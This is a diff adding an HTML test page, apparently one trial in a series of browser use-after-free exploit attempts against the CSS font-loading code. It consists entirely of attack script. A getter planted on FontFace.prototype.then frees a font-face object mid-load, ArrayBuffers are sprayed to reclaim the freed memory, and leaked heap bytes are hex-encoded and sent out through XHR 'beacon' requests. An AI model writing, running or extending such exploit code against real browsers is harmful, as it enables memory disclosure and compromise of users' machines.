@@ -1,0 +1,66 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf35</title>
+<script>
+/* par33 trigger verbatim, one trial, and the reclaim sweep inside the window:
+   the freed CSSFontFace chunk is claimed by whichever size class it belongs to.
+   No beacon, string, or XHR runs between the free and the allocations. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var SIZES = [192];
+var K = 64, styleEl = null, firedHere = false, done = false;
+function hex(v){ return ('0' + v.toString(16)).slice(-2); }
+function setup(){
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U35-SETUP');
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var si = 0; si < SIZES.length; si++) {
+        var size = SIZES[si];
+        for (var k = 0; k < K; k++) {
+          var ab = new ArrayBuffer(size);
+          window.__map.push({ size: size, view: new Uint8Array(ab) });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('U35-LOAD-CALLED');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('U35-RESOLVED'); }, function(){ b('U35-REJECTED'); });
+  setTimeout(scan, 60);
+  setTimeout(scan, 400);
+  setTimeout(function(){ if (!done) b('U35-NOSCAN-fired-' + (firedHere ? 1 : 0)); }, 1500);
+}
+function scan(){
+  if (done) return;
+  var m = window.__map; if (!m || !m.length) return;
+  done = true;
+  var out = [];
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0, first = -1;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) { n++; if (first < 0) first = j; }
+    if (n) {
+      var s = '';
+      var stop = Math.min(v.length, first + 256); for (var j = first; j < stop; j++) s += hex(v[j]);
+      out.push('b' + i + '-s' + m[i].size + '-o' + first + '-n' + n + '-' + s);
+    }
+  }
+  if (!out.length) { b('U35-ALL-CLEAN-' + m.length); return; }
+  b('U35-HIT-' + out.join('_'));
+}
+function run(){ setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>uaf35</p></body></html>
